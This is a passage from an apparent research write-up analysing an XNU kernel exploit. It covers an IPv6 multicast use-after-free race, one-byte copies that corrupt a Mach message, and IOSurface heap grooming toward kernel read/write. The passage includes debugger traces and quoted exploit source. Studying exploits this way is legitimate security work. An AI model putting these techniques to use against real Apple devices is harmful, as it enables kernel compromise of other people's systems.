    frame #2: 0xfffffe00183d4244 kernel.release.vmapple`ip6_setmoptions(inp=<unavailable>, sopt=<unavailable>) at in6_mcast.c:3062:11 [opt]
    frame #3: 0xfffffe00183c8068 kernel.release.vmapple`ip6_ctloutput(so=0xfffffe150f99f128, sopt=0xfffffe60298cbd80) at ip6_output.c:2723:13 [opt]
    frame #4: 0xfffffe00184d53e4 kernel.release.vmapple`sosetoptlock(so=0xfffffe150f99f128, sopt=0xfffffe60298cbd80, dolock=1) at uipc_socket.c:5035:12 [opt]
    frame #5: 0xfffffe00184e3e80 kernel.release.vmapple`setsockopt(p=0xfffffe1513aa0098, uap=0xfffffe151118a560, retval=<unavailable>) at uipc_syscalls.c:2520:10 [opt]
    frame #6: 0xfffffe0018587e84 kernel.release.vmapple`unix_syscall(state=0xfffffe1510292470, thread_act=<unavailable>, uthread=0xfffffe151118a560, proc=0xfffffe1513aa0098) at systemcalls.c:193:10 [opt]
    frame #7: 0xfffffe0018072cf4 kernel.release.vmapple`handle_svc(state=0xfffffe1510292470) at sleh.c:2419:3 [opt] [inlined]
    frame #8: 0xfffffe0018072ce8 kernel.release.vmapple`sleh_synchronous(context=0xfffffe1510292470, esr=<unavailable>, far=6097924096) at sleh.c:743:3 [opt]
    frame #9: 0xfffffe0017f0479c kernel.release.vmapple`fleh_synchronous + 40
    frame #10: 0x00000001a9705d70
    frame #11: 0x00000001a973d4ec

...

(lldb) w s e -s 8 -- 0xfffffe228d003f88
Watchpoint created: Watchpoint 1: addr = 0xfffffe228d003f88 size = 8 state = enabled type = m
    watchpoint spec = '0xfffffe228d003f88'
    watchpoint resources:
       #0: addr = 0xfffffe228d003f88 size = 8
Watchpoint 1 hit:
    
new value: 34359738368
(lldb) c
Process 1 resuming

Watchpoint 1 hit:
old value: 34359738368
new value: 0
Process 1 stopped
* thread #1, name = 'CPU0', stop reason = watchpoint 1
    frame #0: 0xfffffe001478b100 kernel.release.vmapple`ExceptionVectorsBase + 256
kernel.release.vmapple`ExceptionVectorsBase:
->  0xfffffe001478b100 <+256>: b      0xfffffe001478c148 ; el1_sp0_fiq_vector_long
    0xfffffe001478b104 <+260>: nop    
    0xfffffe001478b108 <+264>: nop    
    0xfffffe001478b10c <+268>: nop    
Target 0: (kernel.release.vmapple) stopped.
(lldb) bt
* thread #1, name = 'CPU0', stop reason = watchpoint 1
  * frame #0: 0xfffffe001478b100 kernel.release.vmapple`ExceptionVectorsBase + 256
    frame #1: 0xfffffe0014c5c4f0 kernel.release.vmapple`in6p_join_group(inp=<unavailable>, sopt=<unavailable>) at in6_mcast.c:2310:7 [opt] [inlined]
    frame #2: 0xfffffe0014c5c244 kernel.release.vmapple`ip6_setmoptions(inp=<unavailable>, sopt=<unavailable>) at in6_mcast.c:3062:11 [opt]
    frame #3: 0xfffffe0014c50068 kernel.release.vmapple`ip6_ctloutput(so=0xfffffe151067f4f0, sopt=0xfffffe6029c7bd80) at ip6_output.c:2723:13 [opt]
    frame #4: 0xfffffe0014d5d3e4 kernel.release.vmapple`sosetoptlock(so=0xfffffe151067f4f0, sopt=0xfffffe6029c7bd80, dolock=1) at uipc_socket.c:5035:12 [opt]
    frame #5: 0xfffffe0014d6be80 kernel.release.vmapple`setsockopt(p=0xfffffe15160622c8, uap=0xfffffe150fd5f3c0, retval=<unavailable>) at uipc_syscalls.c:2520:10 [opt]
    frame #6: 0xfffffe0014e0fe84 kernel.release.vmapple`unix_syscall(state=0xfffffe150f543ba0, thread_act=<unavailable>, uthread=0xfffffe150fd5f3c0, proc=0xfffffe15160622c8) at systemcalls.c:193:10 [opt]
    frame #7: 0xfffffe00148facf4 kernel.release.vmapple`handle_svc(state=0xfffffe150f543ba0) at sleh.c:2419:3 [opt] [inlined]
    frame #8: 0xfffffe00148face8 kernel.release.vmapple`sleh_synchronous(context=0xfffffe150f543ba0, esr=<unavailable>, far=4374465568) at sleh.c:743:3 [opt]
    frame #9: 0xfffffe001478c79c kernel.release.vmapple`fleh_synchronous + 40
    frame #10: 0x00000001a88a9d70
    frame #11: 0x00000001a88e14ec
```

After examining the code a bit further,
I confirmed that 1‑byte copy occurs at **0xFFFFFE00076C0540**.

![Screenshot 2025-11-21 at 3.22.16 PM.png](pics/Screenshot_2025-11-21_at_3.22.16_PM.png)

- 1 byte-copy for modifying trailer size of kmsg

```c
Target 0: (kernel.release.vmapple) stopped.
(lldb) bt
* thread #3, name = 'CPU2', stop reason = breakpoint 2.1
  * frame #0: 0xfffffe0026d885b0 kernel.release.vmapple`im6f_commit(imf=<unavailable>) at in6_mcast.c:827:20 [opt] [inlined]
    frame #1: 0xfffffe0026d88520 kernel.release.vmapple`in6p_join_group(inp=<unavailable>, sopt=<unavailable>) at in6_mcast.c:2343:3 [opt] [inlined]
    frame #2: 0xfffffe0026d88244 kernel.release.vmapple`ip6_setmoptions(inp=<unavailable>, sopt=<unavailable>) at in6_mcast.c:3062:11 [opt]
    frame #3: 0xfffffe0026d7c068 kernel.release.vmapple`ip6_ctloutput(so=0xfffffe15102c87d8, sopt=0xfffffe6029bbbd80) at ip6_output.c:2723:13 [opt]
    frame #4: 0xfffffe0026e893e4 kernel.release.vmapple`sosetoptlock(so=0xfffffe15102c87d8, sopt=0xfffffe6029bbbd80, dolock=1) at uipc_socket.c:5035:12 [opt]
    frame #5: 0xfffffe0026e97e80 kernel.release.vmapple`setsockopt(p=0xfffffe1513802cb8, uap=0xfffffe1510b16e00, retval=<unavailable>) at uipc_syscalls.c:2520:10 [opt]
    frame #6: 0xfffffe0026f3be84 kernel.release.vmapple`unix_syscall(state=0xfffffe15108867c0, thread_act=<unavailable>, uthread=0xfffffe1510b16e00, proc=0xfffffe1513802cb8) at systemcalls.c:193:10 [opt]
    frame #7: 0xfffffe0026a26cf4 kernel.release.vmapple`handle_svc(state=0xfffffe15108867c0) at sleh.c:2419:3 [opt] [inlined]
    frame #8: 0xfffffe0026a26ce8 kernel.release.vmapple`sleh_synchronous(context=0xfffffe15108867c0, esr=<unavailable>, far=4487431880) at sleh.c:743:3 [opt]
    frame #9: 0xfffffe00268b879c kernel.release.vmapple`fleh_synchronous + 40
    frame #10: 0x000000019485dd70
    frame #11: 0x0000000100a80748   //_get_arb_free_holder+0x3c (-> _mcast_increase_race_reliability-> _setsockopt)
    frame #12: 0x0000000100a81270   //_exploit_get_krw_and_kernel_base+0x40
    frame #13: 0x0000000100a813b4   //_main+0x50
    frame #14: 0x0000000100e690f4
(lldb) x/4i $pc
->  0xfffffe0026d88540: ldrb   w9, [x9, #0x29]
    0xfffffe0026d88544: strb   w9, [x8, #0x28]
    0xfffffe0026d88548: ldr    x10, [x8, #0x8]
    0xfffffe0026d8854c: cbz    x10, 0xfffffe0026d88564 ; <+6200> [inlined] ip6_msource_tree_RB_GETPARENT at in6_mcast.c:164:1
(lldb) reg read  x8 x9
      x8 = 0xfffffe228d003f64
      x9 = 0xfffffe228d003f64
(lldb) x/bx 0xfffffe228d003f64+0x28
0xfffffe228d003f8c: 0x08
(lldb) x/bx 0xfffffe228d003f64+0x29
0xfffffe228d003f8d: 0x00
```

- 1 byte-copy for modifying kmsg’s message bits (`kheap_data_ports(type: ipc_port)'s kmsg->ikm_data->msgh_bits`)

```c
(lldb) br list
Current breakpoints:
1: address = kernel.release.vmapple[0xfffffe00076c0540], locations = 1, resolved = 1, hit count = 1
  1.1: where = kernel.release.vmapple`ip6_setmoptions + 6164 [inlined] im6f_commit + 32 at in6_mcast.c:825:23, address = 0xfffffe002b7fc540, resolved, hit count = 1 

(lldb) breakpoint modify 1 -c "$x9 != 0xfffffe228d003f64"

(lldb) bt
* thread #1, name = 'CPU0', stop reason = breakpoint 1.1
  * frame #0: 0xfffffe002b7fc540 kernel.release.vmapple`im6f_commit(imf=<unavailable>) at in6_mcast.c:825:23 [opt] [inlined]
    frame #1: 0xfffffe002b7fc520 kernel.release.vmapple`in6p_join_group(inp=<unavailable>, sopt=<unavailable>) at in6_mcast.c:2343:3 [opt] [inlined]
    frame #2: 0xfffffe002b7fc244 kernel.release.vmapple`ip6_setmoptions(inp=<unavailable>, sopt=<unavailable>) at in6_mcast.c:3062:11 [opt]
    frame #3: 0xfffffe002b7f0068 kernel.release.vmapple`ip6_ctloutput(so=0xfffffe15106656f8, sopt=0xfffffe6029e2bd80) at ip6_output.c:2723:13 [opt]
    frame #4: 0xfffffe002b8fd3e4 kernel.release.vmapple`sosetoptlock(so=0xfffffe15106656f8, sopt=0xfffffe6029e2bd80, dolock=1) at uipc_socket.c:5035:12 [opt]
    frame #5: 0xfffffe002b90be80 kernel.release.vmapple`setsockopt(p=0xfffffe15111b5478, uap=0xfffffe15114ace60, retval=<unavailable>) at uipc_syscalls.c:2520:10 [opt]
    frame #6: 0xfffffe002b9afe84 kernel.release.vmapple`unix_syscall(state=0xfffffe150f1a86a0, thread_act=<unavailable>, uthread=0xfffffe15114ace60, proc=0xfffffe15111b5478) at systemcalls.c:193:10 [opt]
    frame #7: 0xfffffe002b49acf4 kernel.release.vmapple`handle_svc(state=0xfffffe150f1a86a0) at sleh.c:2419:3 [opt] [inlined]
    frame #8: 0xfffffe002b49ace8 kernel.release.vmapple`sleh_synchronous(context=0xfffffe150f1a86a0, esr=<unavailable>, far=6164079312) at sleh.c:743:3 [opt]
    frame #9: 0xfffffe002b32c79c kernel.release.vmapple`fleh_synchronous + 40
    frame #10: 0x00000001af8b5d70
    frame #11: 0x00000001af8ed4ec
(lldb) x/4i $pc
->  0xfffffe002b7fc540: ldrb   w9, [x9, #0x29]
    0xfffffe002b7fc544: strb   w9, [x8, #0x28]
    0xfffffe002b7fc548: ldr    x10, [x8, #0x8]
    0xfffffe002b7fc54c: cbz    x10, 0xfffffe002b7fc564 ; <+6200> [inlined] ip6_msource_tree_RB_GETPARENT at in6_mcast.c:164:1
(lldb) reg read  x8 x9
      x8 = 0xfffffe228cffffdb
      x9 = 0xfffffe228cffffdb
(lldb) x/bx 0xfffffe228cffffdb+0x28
0xfffffe228d000003: 0x00
(lldb) x/bx 0xfffffe228cffffdb+0x29
0xfffffe228d000004: 0x88
```

Additionally, I temporarily changed `BYTECOPY_SECOND_TARGET` value to **0x4141414141414141**.
Then I set a breakpoint at `panic` and checked backtrace, which looked as follows.

```c
(lldb) b panic
Breakpoint 1: where = kernel.release.vmapple`panic + 20 at debug.c:872:2, address = 0xfffffe001593eea4
Process 1 stopped
* thread #1, name = 'CPU0', stop reason = breakpoint 1.1
    frame #0: 0xfffffe001593eea4 kernel.release.vmapple`panic(str="%s at pc 0x%016llx, lr 0x%016llx (saved state: %p%s)\n\t  x0:  0x%016llx x1:  0x%016llx  x2:  0x%016llx  x3:  0x%016llx\n\t  x4:  0x%016llx x5:  0x%016llx  x6:  0x%016llx  x7:  0x%016llx\n\t  x8:  0x%016llx x9:  0x%016llx  x10: 0x%016llx  x11: 0x%016llx\n\t  x12: 0x%016llx x13: 0x%016llx  x14: 0x%016llx  x15: 0x%016llx\n\t  x16: 0x%016llx x17: 0x%016llx  x18: 0x%016llx  x19: 0x%016llx\n\t  x20: 0x%016llx x21: 0x%016llx  x22: 0x%016llx  x23: 0x%016llx\n\t  x24: 0x%016llx x25: 0x%016llx  x26: 0x%016llx  x27: 0x%016llx\n\t  x28: 0x%016llx fp:  0x%016llx  lr:  0x%016llx  sp:  0x%016llx\n\t  pc:  0x%016llx cpsr: 0x%08x         esr: 0x%08x          far: 0x%016llx\n") at debug.c:872:2 [opt]
Target 0: (kernel.release.vmapple) stopped.
(lldb) bt
* thread #1, name = 'CPU0', stop reason = breakpoint 1.1
  * frame #0: 0xfffffe001593eea4 kernel.release.vmapple`panic(str="%s at pc 0x%016llx, lr 0x%016llx (saved state: %p%s)\n\t  x0:  0x%016llx x1:  0x%016llx  x2:  0x%016llx  x3:  0x%016llx\n\t  x4:  0x%016llx x5:  0x%016llx  x6:  0x%016llx  x7:  0x%016llx\n\t  x8:  0x%016llx x9:  0x%016llx  x10: 0x%016llx  x11: 0x%016llx\n\t  x12: 0x%016llx x13: 0x%016llx  x14: 0x%016llx  x15: 0x%016llx\n\t  x16: 0x%016llx x17: 0x%016llx  x18: 0x%016llx  x19: 0x%016llx\n\t  x20: 0x%016llx x21: 0x%016llx  x22: 0x%016llx  x23: 0x%016llx\n\t  x24: 0x%016llx x25: 0x%016llx  x26: 0x%016llx  x27: 0x%016llx\n\t  x28: 0x%016llx fp:  0x%016llx  lr:  0x%016llx  sp:  0x%016llx\n\t  pc:  0x%016llx cpsr: 0x%08x         esr: 0x%08x          far: 0x%016llx\n") at debug.c:872:2 [opt]
    frame #1: 0xfffffe0015946054 kernel.release.vmapple`panic_with_thread_kernel_state(msg="Kernel data abort.", ss=0xfffffe6029cc3300) at sleh.c:543:2 [opt]
    frame #2: 0xfffffe0015284ba4 kernel.release.vmapple`handle_kernel_abort(state=0xfffffe6029cc3300, esr=2516582404, fault_addr=4702111234474983745, fault_code=FSC_TRANSLATION_FAULT_L0, fault_type=1, recover=0, expected_fault_handler=<unavailable>) at sleh.c:2366:2 [opt]
    frame #3: 0xfffffe0015282d74 kernel.release.vmapple`handle_abort(state=0xfffffe6029cc3300, esr=2516582404, fault_addr=4702111234474983745, recover=0, inspect_abort=<unavailable>, handler=<unavailable>, expected_fault_handler=0x0000000000000000) at sleh.c:1169:2 [opt] [inlined]
    frame #4: 0xfffffe0015282d5c kernel.release.vmapple`sleh_synchronous(context=0xfffffe6029cc3300, esr=2516582404, far=4702111234474983745) at sleh.c:786:3 [opt]
    frame #5: 0xfffffe001511479c kernel.release.vmapple`fleh_synchronous + 40
    frame #6: 0xfffffe00155e1218 kernel.release.vmapple`ip6_msource_tree_RB_NEXT(elm=0x4141414141414141) at in6_mcast.c:164:1 [opt] [inlined]
    frame #7: 0xfffffe00155e120c kernel.release.vmapple`in6m_merge(inm=0xfffffe151d9210a0, imf=0xfffffe2286659fd0) at in6_mcast.c:1005:2 [opt]
    frame #8: 0xfffffe00155e081c kernel.release.vmapple`in6_mc_join(ifp=0xfffffe150e48cbb8, mcaddr=0xfffffe6029cc387c, imf=0xfffffe2286659fd0, pinm=0xfffffe6029cc3820, delay=0) at in6_mcast.c:1282:10 [opt]
    frame #9: 0xfffffe00155e4474 kernel.release.vmapple`in6p_join_group(inp=0xfffffe150ea2bd40, sopt=<unavailable>) at in6_mcast.c:2303:11 [opt] [inlined]
    frame #10: 0xfffffe00155e4244 kernel.release.vmapple`ip6_setmoptions(inp=0xfffffe150ea2bd40, sopt=<unavailable>) at in6_mcast.c:3062:11 [opt]
    frame #11: 0xfffffe00155d8068 kernel.release.vmapple`ip6_ctloutput(so=0xfffffe151043d330, sopt=0xfffffe6029cc3d80) at ip6_output.c:2723:13 [opt]
    frame #12: 0xfffffe00156e53e4 kernel.release.vmapple`sosetoptlock(so=0xfffffe151043d330, sopt=0xfffffe6029cc3d80, dolock=1) at uipc_socket.c:5035:12 [opt]
    frame #13: 0xfffffe00156f3e80 kernel.release.vmapple`setsockopt(p=0xfffffe1514368a88, uap=0xfffffe1510fa0000, retval=<unavailable>) at uipc_syscalls.c:2520:10 [opt]
    frame #14: 0xfffffe0015797e84 kernel.release.vmapple`unix_syscall(state=0xfffffe150f6f1090, thread_act=<unavailable>, uthread=0xfffffe1510fa0000, proc=0xfffffe1514368a88) at systemcalls.c:193:10 [opt]
    frame #15: 0xfffffe0015282cf4 kernel.release.vmapple`handle_svc(state=0xfffffe150f6f1090) at sleh.c:2419:3 [opt] [inlined]
    frame #16: 0xfffffe0015282ce8 kernel.release.vmapple`sleh_synchronous(context=0xfffffe150f6f1090, esr=<unavailable>, far=6161891120) at sleh.c:743:3 [opt]
    frame #17: 0xfffffe001511479c kernel.release.vmapple`fleh_synchronous + 40
    frame #18: 0x0000000180c09d70
    frame #19: 0x0000000180c414ec
```

What we can infer from above backtrace is that..
At [xnu-8019.41.5/bsd/netinet6/in6_mcast.c:1005](https://github.com/apple-oss-distributions/xnu/blob/xnu-8019.41.5/bsd/netinet6/in6_mcast.c#L1005), the `RB_FOREACH` macro iterates through the elements, but

![Screenshot 2025-11-21 at 2.36.55 PM.png](pics/Screenshot_2025-11-21_at_2.36.55_PM.png)

As shown below, `elm` points to invalid kernel address, which causes panic.

```c
frame #6: 0xfffffe00155e1218 kernel.release.vmapple`ip6_msource_tree_RB_NEXT(elm=0x4141414141414141) at in6_mcast.c:164:1 [opt] [inlined]
```

Next, the values of `inm` and `imf` are as follows:

```c
frame #7: 0xfffffe00155e120c kernel.release.vmapple`in6m_merge(inm=0xfffffe151d9210a0, imf=0xfffffe2286659fd0) at in6_mcast.c:1005:2 [opt]
```

The [type of `imf`](https://github.com/apple-oss-distributions/xnu/blob/xnu-8019.41.5/bsd/netinet6/in6_mcast.c#L985) is `struct in6_mfilter*`, which is structured as follows:

`imf->im6f_sources.rbh_root->rbe_right` contains the value `0x4141414141414141`.

```c
(lldb) type lookup in6_mfilte
struct in6_mfilter {
    ip6_msource_tree im6f_sources;
    u_long im6f_nsrc;
    uint8_t im6f_st[2];
}

(lldb) p/x *(struct in6_mfilter *)0xfffffe2286659fd0
(struct in6_mfilter) {
  im6f_sources = {
    rbh_root = 0xfffffe228d003f64
  }
  im6f_nsrc = 0x0000000000000000
  im6f_st = {
    [0] = 0x00
    [1] = 0x00
  }
}

(lldb) type lookup ip6_msource_tree
struct ip6_msource_tree {
    ip6_msource *rbh_root;
}

(lldb) type lookup ip6_msource
struct ip6_msource {
    struct  {
        ip6_msource *rbe_left;
        ip6_msource *rbe_right;
        ip6_msource *rbe_parent;
    };
    ip6_msource::(unnamed struct) im6s_link;
    in6_addr im6s_addr;
    im6s_st im6s_st[2];
    uint8_t im6s_stp;
}

(lldb) p/x *(ip6_msource*)0xfffffe228d003f64
(ip6_msource) {
  im6s_link = {
    rbe_left = NULL
    rbe_right = 0x4141414141414141
    rbe_parent = NULL
  }
  im6s_addr = {
    __u6_addr = {
      __u6_addr8 = {
        [0] = 0x00
        [1] = 0x00
        [2] = 0x00
        [3] = 0x00
        [4] = 0x00
        [5] = 0x00
        [6] = 0x00
        [7] = 0x00
        [8] = 0x00
        [9] = 0x00
        [10] = 0x00
        [11] = 0x00
        [12] = 0x00
        [13] = 0x00
        [14] = 0x00
        [15] = 0x00
      }
      __u6_addr16 = ([0] = 0x0000, [1] = 0x0000, [2] = 0x0000, [3] = 0x0000, [4] = 0x0000, [5] = 0x0000, [6] = 0x0000, [7] = 0x0000)
      __u6_addr32 = ([0] = 0x00000000, [1] = 0x00000000, [2] = 0x00000000, [3] = 0x00000000)
    }
  }
  im6s_st = {
    [0] = (ex = 0x0008, in = 0x0000)
    [1] = (ex = 0x0000, in = 0x0000)
  }
  im6s_stp = 0xf5
}
```

For reference, the part related to the `RB_FOREACH` macro,
`RB_FOREACH(ims, ip6_msource_tree, &imf->im6f_sources) {` also appears in `im6f_commit` function, where 1‑byte copy occurs, using same loop structure.

```c
// xnu-8019.41.5/bsd/netinet6/in6_mcast.c#L818
static void
im6f_commit(struct in6_mfilter *imf)
{
	struct ip6_msource      *ims;
	struct in6_msource      *lims;

	RB_FOREACH(ims, ip6_msource_tree, &imf->im6f_sources) {
		lims = (struct in6_msource *)ims;
		lims->im6sl_st[0] = lims->im6sl_st[1];	//1-byte copy
	}
	imf->im6f_st[0] = imf->im6f_st[1];	//1-byte copy
}
```

Therefore, `BYTECOPY_SECOND_TARGET` macro can be seen as controlling value of `imf->im6f_sources.rbh_root->rbe_right` where the second copy occurs.

If `BYTECOPY_SECOND_TARGET` had been original value used to make exploit work, **0xfffffe228cffffdb (0xfffffe228d000000 + 3 - 0x28)**, it would have proceeded as follows:

```c
(lldb) p/x *(in6_msource *)0xfffffe228cffffdb
(in6_msource) {
  im6s_link = {
    rbe_left = NULL
    rbe_right = NULL
    rbe_parent = NULL
  }
  im6s_addr = {
    __u6_addr = {
      __u6_addr8 = {
        [0] = 0x00
        [1] = 0x00
        [2] = 0x00
        [3] = 0x00
        [4] = 0x00
        [5] = 0x00
        [6] = 0x00
        [7] = 0x00
        [8] = 0x00
        [9] = 0x00
        [10] = 0x00
        [11] = 0x00
        [12] = 0x00
        [13] = 0x11
        [14] = 0x00
        [15] = 0x00
      }
      __u6_addr16 = ([0] = 0x0000, [1] = 0x0000, [2] = 0x0000, [3] = 0x0000, [4] = 0x0000, [5] = 0x0000, [6] = 0x1100, [7] = 0x0000)
      __u6_addr32 = ([0] = 0x00000000, [1] = 0x00000000, [2] = 0x00000000, [3] = 0x00001100)
    }
  }
  im6sl_st = {
    [0] = 0x00
    [1] = 0x88
  }
}
```

After that, due to line `lims->im6sl_st[0] = lims->im6sl_st[1];`,
the value of `im6sl_st[0]`—which was originally **0x00**—would have been overwritten with the value of `im6sl_st[1]`, **0x88**, resulting in 1‑byte copy.

This explains why, in the “2‑1 Before vs After” section, the topmost byte of the `msgh_bits` field changed; from **0x00000011 → 0x88000011**.
(In other words, it makes sense.)

## 2-6. Summary of `get_arb_free_holder()`

- Looking at exploit code, `get_arb_free_holder` function initially performs `mcast_join_group` calls total of 64 times (`UAF_BUFFER_KALLOC_1664_JOIN_COUNT`), including asynchronous execution.
- The reason for these 64 iterations (which will be detailed later with vulnerability) is to force allocation into `default.kalloc.1664` zone by continuously increasing kernel allocation size via `im6o_grow` within `in6p_join_group`. Additionally, it serves to populate `imo->im6o_mfilters`—an array containing multiple `imf` pointers—with arbitrary data via `necp_client_action` syscall later.
- From this point on, explanation will be combined with vulnerability details.
- Invoking `mcast_join_group` multiple times asynchronously via threads can trigger a **Use-After-Free (UAF)** bug the moment the lock is released within `in6p_join_group`.
- Consequently, other concurrent `in6p_join_group` calls may reallocate `im6o_membership` and `im6o_mfilters`, rendering `imf` pointer invalid.
- Subsequently, this dangling pointer can be accessed within `in6_mc_join`.
- As previously explained, the array containing the dangling pointers resides in `default.kalloc.1664` zone because reallocation size of `nmfilters` (i.e., `imo->im6o_mfilters`) was increased by `im6o_grow`.
- We can reclaim (refill) the kernel allocation within that zone using `necp_client_action` system call.
- Examining exploit code during refill, we can observe that value `BYTECOPY_FIRST_TARGET` is placed at `necp_buf + 0x278`. In kernel context, this corresponds to `imf->im6f_sources.rbh_root`.
- Since `imf->im6f_sources.rbh_root` now holds `BYTECOPY_FIRST_TARGET` value, **1-byte copy** occurring in `im6f_commit` allows us to manipulate **trailer size from 8 to 0**.
- Additionally, `BYTECOPY_SECOND_TARGET` value is placed at address `BYTECOPY_FIRST_TARGET + 8`. It is located at +8 offset because this corresponds to `im6s_link.rbe_right` field within `ip6_msource` structure.
- In `im6f_commit`, the code iterates using `RB_FOREACH` macro. Since `rbe_right` value becomes `imf`, another 1-byte copy occurs. This changes upper byte of `msgh_bits` from `0x0` to `0x88`, thereby setting `MACH_MSGH_BITS_COMPLEX` (`0x80000000`) in `kmsg`.
- To verify if 1-byte copy was successful, we check trailer size using `mach_port_peek`.
- If trailer size is not 8, then that port is `kheap_data_ports[i]` where 1-byte copy occurred.

## 2-6-1. Summary of `get_arb_free_holder()` (Picture)

It can be represented as shown below.
(Recommend for downloading picture on PC but not mobile, because resolution is too high :/ )

English Version:

![Drawing 2025-11-05 23.49.57.excalidraw 1 1 1 1-min.png](pics/Drawing_2025-11-05_23.49.57.excalidraw_1_1_1_1-min.png)

Korean Version:

![Drawing 2025-11-05 23.49.57.excalidraw 1 1 1-min.png](pics/Drawing_2025-11-05_23.49.57.excalidraw_1_1_1-min.png)

## 3. exploitation_get_krw_with_arb_free

## 3-1. IOSurface_init

As those familiar with this already know, first `IOServiceGetMatchingService` function is used to find IOSurface service, which is related to graphics acceleration. After that, `IOServiceOpen` function is called, which is typically used by user-space process to obtain userclient from kernel-registered I/O service driver.

Here, `IOSurfaceRoot_init` is called once before creating the `IOSurfaceClients` array of size 0x4000.

```c
io_connect_t IOSurfaceRoot_init(void)
{
    kern_return_t IOMasterPort(mach_port_t, mach_port_t *);
    mach_port_t mp = MACH_PORT_NULL;
    IOMasterPort(MACH_PORT_NULL, &mp);
    io_connect_t uc;

    io_service_t s = IOServiceGetMatchingService(mp, IOServiceMatching("IOSurfaceRoot"));
    if (s == MACH_PORT_NULL)
    {
        return 0;
    }
    
    if (IOServiceOpen(s, mach_task_self(), 0, &uc) != KERN_SUCCESS)
    {
        return 0;
    }
    
    return uc;
}

int exploitation_get_krw_with_arb_free(mach_port_t arb_free_holder, uint64_t *kernel_base)
{
    uint8_t msg_buf[0x100];
    int fildes[2];
    pipe(fildes);
    int read_pipe = fildes[0];
    int write_pipe = fildes[1];
    kern_return_t kr = KERN_SUCCESS;
    
    // alloc this one before array of IOSurfaceClients becomes 0x4000
    io_connect_t iosurface_connect_krw = IOSurfaceRoot_init();
    ...
} 
```

We can see call `IOSurfaceRoot_cause_array_size_to_be_0x4000`, 
which is intended to make size of `IOSurfaceClients` array 0x4000.
Looking more closely, it calls `IOSurfaceRoot_create_surface_fast`.

```c
uint32_t IOSurfaceRoot_cause_array_size_to_be_0x4000(void)
{
    for (int i = 0; i < 4; ++i)
    {
        io_connect_t uc = IOSurfaceRoot_init();
        for (int i = 0; i < 0xf00; ++i)
        {
            uint32_t last_id = IOSurfaceRoot_create_surface_fast(uc);
            if (0x3400 <= (last_id * sizeof(uint64_t)))
            {
                return last_id;
            }
        }
    }
    
    return -1;
}

int exploitation_get_krw_with_arb_free(mach_port_t arb_free_holder, uint64_t *kernel_base)
{
    ...
    // cause max size of arrays of IOSurfaceClients to become 0x4000
    uint32_t last_id = IOSurfaceRoot_cause_array_size_to_be_0x4000();
    printf("last_id = 0x%x\n", last_id);
    ...
}
```

## 3-2. IOSurfaceRoot_create_surface_fast

Before transitioning to kernel, `alloc_size` is set to 0x4000 (in fact, any non-zero value would work) and passed via call to `IOConnectCallMethod`.

From examining previous `mach_swap2` exploit that I studied before, this behaves similarly to `IOSurfaceRootUserClient::s_create_surface` in `IOSurface_init` function.

Finally, the `surface_id` is obtained.

```c
uint32_t IOSurfaceRoot_create_surface_fast(io_connect_t uc)
{
    // Brandon Azad's definitions from https://bugs.chromium.org/p/project-zero/issues/detail?id=1986#c4
    struct _IOSurfaceFastCreateArgs {
        uint64_t address;
        uint32_t width;
        uint32_t height;
        uint32_t pixel_format;
        uint32_t bytes_per_element;
        uint32_t bytes_per_row;
        uint32_t alloc_size;
    };

    struct IOSurfaceLockResult {
        uint8_t _pad1[0x18];
        uint32_t surface_id;
        uint8_t _pad2[0xF60-0x18-0x4];
    };
    
    struct _IOSurfaceFastCreateArgs create_args = { .alloc_size = (uint32_t) 0x4000 };
    struct IOSurfaceLockResult lock_result = {0};
    uint64_t lock_result_size = sizeof(lock_result);
    
    IOConnectCallMethod(
            uc,
            6,
            NULL, 0,
            &create_args, sizeof(create_args),
            NULL, NULL,
            &lock_result, (size_t *)&lock_result_size);
    
    return lock_result.surface_id;
}
```

Examining the kernel code along with figure below:
IOSurfaceRootUserClient::create_surface_fast_path
→ IOSurfaceRoot::createSurface
→ IOSurfaceRoot::createSurface
→ IOSurface::init
→ IOSurface:allocate

![image.png](pics/image%204.png)

The `IOSurfaceRoot::createSurface` function is responsible for creating IOSurface object.

This function takes `OSDictionary` as input and passes it to `IOSurface::init` function.

`IOSurface::init` parses provided properties, and ultimately `IOSurfaceAllocSize` (which is `_IOSurfaceFastCreateArgs`’s `alloc_size`) is set to user-provided value of 0x4000.

The `IOSurface` object essentially wraps `IOMemoryDescriptor`, which is created by calling the following function in `IOSurface::allocate`.

```c
OSSharedPtr<IOMemoryDescriptor>
IOMemoryDescriptor::withAddressRange(mach_vm_address_t address,
    mach_vm_size_t length,
    IOOptionBits   options,
    task_t         task);
```

For reference, when calling `IOSurfaceRootUserClient::create_surface_fast_path`,
the `IOSurfaceAllocSize` (=_IOSurfaceFastCreateArgs’s `alloc_size`) provided by user doesn't have to be exactly 0x4000. Any non-zero value will work, whether 0x1, 0x100, etc.

What is important for us is to call `IOSurfaceRoot_create_surface_fast` multiple times as shown in code below,
so that later when `IOSurfaceRootUserClient::lookup_surface` is called to allocate for `IOSurfaceClients` array, the kernel allocation will be made with size of 0x4000.


```c
uint32_t IOSurfaceRoot_cause_array_size_to_be_0x4000(void)
{
    for (int i = 0; i < 4; ++i)
    {
        io_connect_t uc = IOSurfaceRoot_init();
        for (int i = 0; i < 0xf00; ++i)
        {
            uint32_t last_id = IOSurfaceRoot_create_surface_fast(uc);
            if (0x3400 <= (last_id * sizeof(uint64_t)))
            {
                return last_id;
            }
        }
    }
    
    return -1;
}
```

So, by calling `IOSurfaceRoot_create_surface_fast` function multiple times,
we reach `IOSurface::init` and gradually increase `i_IOSurfaceHandleTotalCapability` to 0x800
in order to enlarge allocation size of `IOSurfaceClients` array.

![image.png](pics/image%205.png)

## 3-3. port_destroy(arb_free_holder);

```c
void port_destroy(mach_port_t p)
{
    mach_port_destroy(mach_task_self(), p);
}

int exploitation_get_krw_with_arb_free(mach_port_t arb_free_holder, uint64_t *kernel_base)
{
...
    // trigger arbitrary free in kheap default
    port_destroy(arb_free_holder);
...
}
```

The value returned by `get_arb_free_holder` is `kheap_data_ports[i]`, where 1-byte copy occurred, which is what we refer to as `arb_free_holder`.

The important point to note here is that if we examine the kmsg of corrupted `arb_free_holder`, the `msgh_bits` field has `MACH_MSGH_BITS_COMPLEX (=0x80000000)` set.

```c
(lldb) p/x *(mach_msg_header_t*)0xfffffe228d000000
(mach_msg_header_t) {
  msgh_bits = 0x88000011 //SET MACH_MSGH_BITS_COMPLEX !!!!!
  msgh_size = 0x00003f88
  msgh_remote_port = 0xfffffe1514a8dd60
  msgh_local_port = NULL
  msgh_voucher_port = 0x00000000
  msgh_id = 0x00000000
}
```

This is great because when msg destroyed, the ‘descriptors’ at beginning of message buffer are treated as kernel addresses and can be freed.

